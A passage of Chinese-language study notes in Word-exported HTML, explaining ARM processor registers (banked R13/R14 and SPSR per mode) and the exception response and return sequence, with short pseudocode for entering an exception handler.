Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R14_svc</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R13_abt</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R14_abt</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R13_und</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R14_und</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R13_irq</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R14_irq</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">R8_frq~R14_frq</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>。</span><span lang="EN-US"><span style="font-family: Times New Roman;">2</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）</span><span lang="EN-US"><span style="font-family: Times New Roman;">6</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个状态寄存器</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>；</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR_svc</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR_abt</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR_und</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR_irq</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>和</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR_fiq</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，</span><span lang="EN-US"><span style="font-family: Times New Roman;">6</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个状态寄存器也是</span><span lang="EN-US"><span style="font-family: Times New Roman;">32</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位的，但目前只使用了其中的</span><span lang="EN-US"><span style="font-family: Times New Roman;">12~14</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">SPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的功能</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>保存</span><span lang="EN-US"><span style="font-family: Times New Roman;">ALU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中的当前操作信息；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>控制允许和禁止中断；</span><span lang="EN-US"><span style="font-family: Times New Roman;">3.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>设置处理器的运行模式。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>异常定义</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：当正常的程序执行流程发生暂时的停止时，称之为异常。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>异常的分类</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>同步异常是由内部事件（如处理器指令运行产生的事件）引起的异常；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>异步异常是由外部事件（如处理器指令执行不相关的事件）引起的异常</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>一般这些外部事件与硬件信号相关</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>又称中断。具体分为：</span><span lang="EN-US"><span style="font-family: Times New Roman;">4</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>类：中断（</span><span lang="EN-US"><span style="font-family: Times New Roman;">interrupt) </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>来自</span><span lang="EN-US"><span style="font-family: Times New Roman;">I/O</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>设备的信号、陷井（</span><span lang="EN-US"><span style="font-family: Times New Roman;">trap</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）有意的异常、故障（</span><span lang="EN-US"><span style="font-family: Times New Roman;">fault) </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>潜在可恢复的错误和终止（</span><span lang="EN-US"><span style="font-family: Times New Roman;">abort) </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>不可恢复的错误。按照引起异常的事件不同分为</span><span lang="EN-US"><span style="font-family: Times New Roman;">3</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>类：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令执行引起的直接异常；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令执行引起的间接异常；</span><span lang="EN-US"><span style="font-family: Times New Roman;">3.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>外部产生的与指令流无关的异常。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>异常响应过程</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>将</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的内容保存到将要执行的异常中断对应的</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中，以实现对处理器当前状态、中断屏蔽位以及各条件标志位的保存。</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>设置当前状态寄存器</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中的相应位：设置</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>模式控制位</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>［</span><span lang="EN-US"><span style="font-family: Times New Roman;">4</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">0</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>］，使处理器进入相应的执行模式；设置中断标志位（</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>［</span><span lang="EN-US"><span style="font-family: Times New Roman;">7</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>］</span><span lang="EN-US"><span style="font-family: Times New Roman;">=1</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>），禁止</span><span lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中断；当进入</span><span lang="EN-US"><span style="font-family: Times New Roman;">Reset</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>或</span><span lang="EN-US"><span style="font-family: Times New Roman;">FIQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>模式时，还要设置中断标志位（</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>［</span><span lang="EN-US"><span style="font-family: Times New Roman;">6</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>］</span><span lang="EN-US"><span style="font-family: Times New Roman;">=1</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>），禁止</span><span lang="EN-US"><span style="font-family: Times New Roman;">FIQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中断。</span><span lang="EN-US"><span style="font-family: Times New Roman;">3.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>将引起异常指令的下一条指令的地址保存到新的异常工作模式的</span><span lang="EN-US"><span style="font-family: Times New Roman;">R14</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>即</span><span lang="EN-US"><span style="font-family: Times New Roman;">R14_mode</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中，使异常处理程序执行完后能正确返回原程序。</span><span lang="EN-US"><span style="font-family: Times New Roman;">4.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>给程序计数器（</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）强制赋值，使程序从相应的矢量地址开始执行中断处理程序。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>伪代码如下</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-size: small; font-family: Times New Roman;">R14_&lt;Exception_Mode&gt; = Return Link</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-size: small; font-family: Times New Roman;">SPSR_&lt;Exception_Mode&gt; = CPSR</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-size: small; font-family: Times New Roman;">CPSR[4:0] = Exception Mode Number</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR[5] = 0//</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>保障在</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态下执行</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR[7] = 1//</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>禁止新的</span><span lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中断</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-size: small;"><span style="font-family: Times New Roman;">If &lt;Exception_Mode&gt; == Reset or FIQ then<span style="mso-tab-count: 2;">              </span></span></span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt; text-indent: 21pt; mso-char-indent-count: 2.0;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR[6] = 1//</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>当</span><span lang="EN-US"><span style="font-family: Times New Roman;">Reset</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>或</span><span lang="EN-US"><span style="font-family: Times New Roman;">FIQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>时，禁止新的</span><span lang="EN-US"><span style="font-family: Times New Roman;">FIQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中断</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-family: Times New Roman;">PC = Exception Vector Address//</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>转入异常入口地址</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>用户程序运行时发生</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中断，硬件完成以下动作</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>将</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存器内容存入</span><span lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>模式的</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存器；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>置位</span><span lang="EN-US"><span style="font-family: Times New Roman;">I</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位（禁止</span><span lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中断）；</span><span lang="EN-US"><span style="font-family: Times New Roman;">3.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>清零</span><span lang="EN-US"><span style="font-family: Times New Roman;">T</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位（进入</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>状态）；</span><span lang="EN-US"><span style="font-family: Times New Roman;">4.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>设置</span><span lang="EN-US"><span style="font-family: Times New Roman;">MOD</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位，切换处理器模式至</span><span lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>模式；</span><span lang="EN-US"><span style="font-family: Times New Roman;">5.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>将下一条指令的地址存入</span><span lang="EN-US"><span style="font-family: Times New Roman;">IRQ</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>模式的</span><span lang="EN-US"><span style="font-family: Times New Roman;">LR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存器；</span><span lang="EN-US"><span style="font-family: Times New Roman;">6.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>将跳转地址存入</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，实现跳转</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>异常中断的返回</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>所有修改过的用户寄存器必须从处理程序的保护堆栈中恢复（即出栈）；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>将</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR_mode</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寄存器内容复制到</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中，使得</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>从相应的</span><span lang="EN-US"><span style="font-family: Times New Roman;">SPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中恢复，即恢复被中断程序的工作状态；</span><span lang="EN-US"><span style="font-family: Times New Roman;">3.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>根据异常类型将</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>变回到用户指令流中相应指令处；</span><span lang="EN-US"><span style="font-family: Times New Roman;">4.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>最后清除</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPSR</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中的中断禁止标志位</span><span lang="EN-US"><span style="font-family: Times New Roman;">I/F</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>。</span></span></span></p> 
